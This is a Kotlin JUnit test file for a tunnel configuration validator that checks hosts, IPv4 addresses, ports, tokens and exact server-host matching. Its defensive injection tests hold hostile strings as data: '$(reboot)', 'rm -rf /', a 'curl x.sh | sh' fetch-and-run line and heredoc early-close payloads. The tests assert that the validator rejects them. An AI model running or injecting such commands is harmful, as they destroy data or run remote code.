package org.didban.monitor

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class TunnelFieldValidationTest {

    // ── hosts ───────────────────────────────────────────────────────────────

    @Test
    fun `accepts DNS hostnames`() {
        assertTrue(TunnelFieldValidation.isHost("example.com"))
        assertTrue(TunnelFieldValidation.isHost("my-server.internal"))
        assertTrue(TunnelFieldValidation.isHost("a-b-c.example.co.uk"))
    }

    @Test
    fun `accepts IPv4 addresses`() {
        assertTrue(TunnelFieldValidation.isHost("10.20.30.40"))
        assertTrue(TunnelFieldValidation.isHost("192.168.1.1"))
    }

    @Test
    fun `rejects shell injection attempts as hosts`() {
        assertFalse(TunnelFieldValidation.isHost("$(reboot)"))
        assertFalse(TunnelFieldValidation.isHost("`id`"))
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4; rm -rf /"))
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4 && curl x.sh | sh"))
        assertFalse(TunnelFieldValidation.isHost("a b"))
        assertFalse(TunnelFieldValidation.isHost(""))
    }

    @Test
    fun `rejects heredoc early-close and script termination`() {
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4\nEOF\nrm -rf /"))
        assertFalse(TunnelFieldValidation.isHost("host\nEOF"))
        assertFalse(TunnelFieldValidation.isHost("host\n"))
        assertFalse(TunnelFieldValidation.isHost("host\"; drop\"; echo x"))
    }

    @Test
    fun `rejects overly long hosts`() {
        assertFalse(TunnelFieldValidation.isHost("a".repeat(254)))
    }

    // ── strict IPv4 (kernel targets) ────────────────────────────────────────

    @Test
    fun `ipv4 strictness`() {
        assertTrue(TunnelFieldValidation.isIpv4("10.200.200.1"))
        assertFalse(TunnelFieldValidation.isIpv4("256.1.1.1"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200.1.5"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200.1; reboot"))
    }

    // ── ports ──────────────────────────────────────────────────────────────

    @Test
    fun `port bounds`() {
        assertTrue(TunnelFieldValidation.isValidPort(1))
        assertTrue(TunnelFieldValidation.isValidPort(65535))
        assertFalse(TunnelFieldValidation.isValidPort(0))
        assertFalse(TunnelFieldValidation.isValidPort(65536))
        assertFalse(TunnelFieldValidation.isValidPort(-1))
    }

    // ── tokens (CLI arguments) ──────────────────────────────────────────────

    @Test
    fun `token charset`() {
        assertTrue(TunnelFieldValidation.isValidToken("Abc_123-x"))
        assertFalse(TunnelFieldValidation.isValidToken("a b"))
        assertFalse(TunnelFieldValidation.isValidToken("a\"b"))
        assertFalse(TunnelFieldValidation.isValidToken("$(x)"))
        assertFalse(TunnelFieldValidation.isValidToken("a\nb"))
        assertFalse(TunnelFieldValidation.isValidToken(""))
        assertFalse(TunnelFieldValidation.isValidToken("a".repeat(129)))
    }

    // ── error-message helpers ───────────────────────────────────────────────

    @Test
    fun `checkHost returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkHost("1.2.3.4", "Host"))
        assertTrue(TunnelFieldValidation.checkHost("1.2.3.4; rm -rf /", "Host")!!.contains("نامعتبر"))
    }

    @Test
    fun `checkIpv4 returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkIpv4("10.1.1.1", "VIP"))
        assertTrue(TunnelFieldValidation.checkIpv4("10.1.1; x", "VIP")!!.contains("IPv4"))
    }

    @Test
    fun `checkToken returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkToken("abc_123", "Token"))
        assertEquals(
            "Token باید ۱ تا ۱۲۸ کاراکتر از [A-Za-z0-9_-] باشد: a b",
            TunnelFieldValidation.checkToken("a b", "Token")
        )
    }

    // ── H16: strict host matching (no substring) ─────────────────────────────

    @Test
    fun `hostMatchesServer - exact, trimmed and case-insensitive`() {
        assertTrue(TunnelFieldValidation.hostMatchesServer("10.0.0.1", "10.0.0.1"))
        assertTrue(TunnelFieldValidation.hostMatchesServer("  Example.com  ", "example.COM"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("", "example.com"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("   ", "example.com"))
    }

    @Test
    fun `hostMatchesServer - never matches by substring (H16 regression)`() {
        // The original bug: a tunnel field containing a registered host as a
        // substring selected the wrong server for auto-deploy.
        assertFalse(TunnelFieldValidation.hostMatchesServer("sub.example.com", "example.com"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("example.com", "sub.example.com"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("10.0.0.100", "10.0.0.1"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("10.0.0.1", "10.0.0.100"))
    }

    @Test
    fun `hostMatchesServer - blank server host never matches`() {
        // "" is a substring of everything; an empty registered host must
        // never absorb a deploy.
        assertFalse(TunnelFieldValidation.hostMatchesServer("example.com", ""))
        assertFalse(TunnelFieldValidation.hostMatchesServer("example.com", "   "))
    }

    @Test
    fun `hostMatchesServer - tunnel field with explicit port`() {
        assertTrue(TunnelFieldValidation.hostMatchesServer("10.0.0.1:443", "10.0.0.1"))
        assertTrue(TunnelFieldValidation.hostMatchesServer("example.com:8443", "EXAMPLE.COM"))
        assertFalse(TunnelFieldValidation.hostMatchesServer("10.0.0.1:443", "10.0.0.2"))
        // A trailing colon+non-digits is not a port, so no match.
        assertFalse(TunnelFieldValidation.hostMatchesServer("10.0.0.1:abc", "10.0.0.1"))
    }

    @Test
    fun `hostMatchesServer - IPv6 handling`() {
        assertTrue(TunnelFieldValidation.hostMatchesServer("[2001:db8::1]:443", "2001:db8::1"))
        assertTrue(TunnelFieldValidation.hostMatchesServer("2001:db8::1", "2001:DB8::1"))
        // Raw IPv6 without a port must not split on the last colon and
        // false-match a different address sharing a prefix.
        assertFalse(TunnelFieldValidation.hostMatchesServer("2001:db8::1", "2001:db8::2"))
    }
}
